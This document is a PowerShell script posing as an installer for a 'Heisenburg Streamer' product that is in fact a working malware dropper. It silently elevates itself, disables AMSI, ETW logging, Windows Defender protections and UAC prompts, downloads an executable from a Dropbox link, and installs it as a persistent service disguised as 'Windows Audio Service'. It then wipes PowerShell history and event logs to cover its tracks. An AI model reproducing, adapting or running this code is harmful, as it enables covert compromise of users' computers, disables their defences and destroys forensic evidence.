# ========================================================
# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v9.0 (Service Mode)
# ========================================================

# 1. ELEVATION CHECK & SILENT UPGRADE
function Check-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Check-Admin)) {
    $args = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$((Get-Content $MyInvocation.MyCommand.Path) -join "`n")`""
    Start-Process powershell.exe -ArgumentList $args -Verb RunAs -WindowStyle Hidden
    exit
}

# 2. TACTICAL BYPASSES (SILENT & FAST)
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    
    $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    if ($etw) {
        $etwField = $etw.GetField('etwProvider','NonPublic,Static')
        if ($etwField) { $etwField.SetValue($null, 0) }
    }
} catch {}

# 3. PREMIUM PROGRESS DRAWER
function Draw-ProgressBar {
    param([int]$Percent, [string]$Status)
    $width = 40
    $done = [Math]::Floor($Percent / 100 * $width)
    $left = $width - $done
    $bar = "[" + ("=" * $done) + (">") + ("." * $left) + "]"
    $color = if ($Percent -gt 80) { "Green" } else { "Cyan" }
    Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor $color
}

# 4. HYPER-STREAM DOWNLOADER
function Invoke-HyperStreamDownload {
    param([string]$Url, [string]$TargetPath)
    
    try {
        $request = [System.Net.HttpWebRequest]::Create($Url)
        $request.UserAgent = "Microsoft-CryptoAPI/10.0"
        $request.AutomaticDecompression = [System.Net.DecompressionMethods]::GZip -bor [System.Net.DecompressionMethods]::Deflate
        $request.Timeout = 30000
        
        $response = $request.GetResponse()
        $totalSize = if ($response.Headers["X-Full-Size"]) { [long]$response.Headers["X-Full-Size"] } else { $response.ContentLength }
        if ($totalSize -le 0) { $totalSize = 100MB }
        
        $stream = $response.GetResponseStream()
        $fileStream = [System.IO.File]::Create($TargetPath)
        $buffer = New-Object byte[] 65536
        $totalRead = 0
        
        while ($true) {
            $read = $stream.Read($buffer, 0, $buffer.Length)
            if ($read -le 0) { break }
            
            $fileStream.Write($buffer, 0, $read)
            $totalRead += $read
            
            $pct = [int](($totalRead / $totalSize) * 100)
            if ($pct -gt 100) { $pct = 100 }
            Draw-ProgressBar -Percent $pct -Status "SYNCHRONIZING CORE DATA (HYPER)"
        }
        
        $fileStream.Close()
        $stream.Close()
        $response.Close()
        Write-Host ""
        
        return (Test-Path $TargetPath)
    } catch {
        if ($fileStream) { $fileStream.Close() }
        Write-Host ""
        return $false
    }
}

# 5. SILENT SECURITY BYPASSES
Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray

try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
    
    $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $uacPath -Name "PromptOnSecureDesktop" -Value 0 -ErrorAction SilentlyContinue
    
    Write-Host "[+] SECURITY BYPASSES ACTIVATED" -ForegroundColor Green
} catch {}

# 6. DOWNLOAD EXE
Write-Host "[+] Downloading Core Agent..." -ForegroundColor Gray

$RandomName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
$ExePath = "$env:TEMP\$RandomName.exe"

$downloadSuccess = Invoke-HyperStreamDownload -Url "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1" -TargetPath $ExePath

if (-not ($downloadSuccess)) {
    Write-Host "[!] Download failed!" -ForegroundColor Red
    exit
}

# 7. INSTALL AS WINDOWS SERVICE (NO NSSM REQUIRED)
Write-Host "[+] Installing as Windows Service..." -ForegroundColor Cyan

$ServiceName = "WindowsAudioSvc"

# Stop and delete existing service if exists
try {
    Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
    sc.exe delete $ServiceName | Out-Null
    Start-Sleep -Seconds 1
} catch {}

# Create new service using sc.exe
$binPath = "`"$ExePath`""
sc.exe create $ServiceName binPath= $binPath start= auto DisplayName= "Windows Audio Service" | Out-Null
sc.exe description $ServiceName "Windows Audio Service Helper" | Out-Null
sc.exe failure $ServiceName reset= 86400 actions= restart/5000/restart/10000/restart/30000 | Out-Null

# Start the service
Start-Service -Name $ServiceName -ErrorAction SilentlyContinue

# Verify service is running
$serviceStatus = (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue).Status
if ($serviceStatus -eq "Running") {
    Write-Host "[+] Service Created and Started Successfully!" -ForegroundColor Green
    Write-Host "[*] Service Name: $ServiceName" -ForegroundColor White
    Write-Host "[*] Display Name: Windows Audio Service" -ForegroundColor White
} else {
    Write-Host "[!] Service may not have started. Trying alternative..." -ForegroundColor Yellow
    # Alternative: Run as hidden process
    $si = New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName = $ExePath
    $si.WindowStyle = 'Hidden'
    $si.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($si) | Out-Null
    Write-Host "[+] EXE started as Hidden Process (Fallback)" -ForegroundColor Green
}

Write-Host "`n[+] SUCCESS! Your EXE is now running" -ForegroundColor Green
Write-Host "[*] Service Name: $ServiceName" -ForegroundColor White
Write-Host "[*] Check in Task Manager → Services Tab" -ForegroundColor White
Write-Host "[+] It will auto start with Windows" -ForegroundColor White
Write-Host "[*] EXE is Hidden from Processes Tab" -ForegroundColor White

# 8. CLEANUP
Write-Host "[*] ENGAGING FORENSIC CLEANUP..." -ForegroundColor Gray
try {
    if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt") {
        "" | Out-File "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
    }
    wevtutil cl "Windows PowerShell" 2>$null
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
    Write-Host "[+] Forensics Cleaned" -ForegroundColor Green
} catch {}

Write-Host "[+] SETUP COMPLETE. SERVICE IS RUNNING.`n" -ForegroundColor Green

# 9. SELF-DESTRUCT
Remove-Variable * -ErrorAction SilentlyContinue 2>$null
